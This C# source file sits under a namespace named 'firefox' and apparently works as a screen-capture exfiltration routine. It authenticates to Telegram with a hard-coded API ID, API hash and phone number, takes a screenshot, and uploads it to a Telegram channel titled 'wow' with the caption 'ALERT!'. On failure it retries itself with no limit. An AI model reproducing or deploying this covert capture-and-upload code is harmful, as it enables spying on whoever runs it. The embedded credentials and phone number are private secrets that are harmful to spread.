using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using TeleSharp.TL;
using TeleSharp.TL.Messages;
using TLSharp.Core;
using TLSharp.Core.Utils;

namespace firefox
{
    class Telegram
    {
        static private string apiHash = "2f6f07426e3e8890591463497dadf6cb";

        static private int apiId = 2571616;
        static TLSharp.Core.FileSessionStore store = new FileSessionStore();

        static TelegramClient client;
        static string phoneNumber = "380507560423";
        public async System.Threading.Tasks.Task<TelegramClient> auth()
        {
            store.Load(apiHash);
            client = new TelegramClient(apiId, apiHash, store, "session");
            await client.ConnectAsync(false);
            Console.WriteLine(client.IsConnected);
            if (!client.IsUserAuthorized())
            {
                var hash = await client.SendCodeRequestAsync(phoneNumber);
                string code;
                code = Console.ReadLine();
                var user = await client.MakeAuthAsync(phoneNumber, hash, code);
            }
            return client;
        }
        public async void send()
        {
            try
            {
                //refresh client
                client = await auth();
                //find channel by title
                var dialogs = (TLDialogs)await client.GetUserDialogsAsync();
                var chat = dialogs.Chats
                             .OfType<TLChannel>()
                            .FirstOrDefault(c => c.Title == "wow");
                //send shit
                //await client.SendMessageAsync(
                //    new TLInputPeerChannel() 
                //    { ChannelId = chat.Id,
                //    AccessHash = chat.AccessHash.Value },
                //    "Your message");
                Util util = new Util();
                Bitmap bitmap = util.CaptureScreen();
                bitmap.Save("cat.jpg");
                var fileResult = (TLInputFile)await client.UploadFile("cat.jpg", new StreamReader("cat.jpg"));
                await client.SendUploadedPhoto(new TLInputPeerChannel()
                {
                    ChannelId = chat.Id,
                    AccessHash = chat.AccessHash.Value
                }, fileResult, "ALERT!");
            } catch
            {
                System.Threading.Thread.Sleep(1000);
                send();
            }
            
        }

    }
}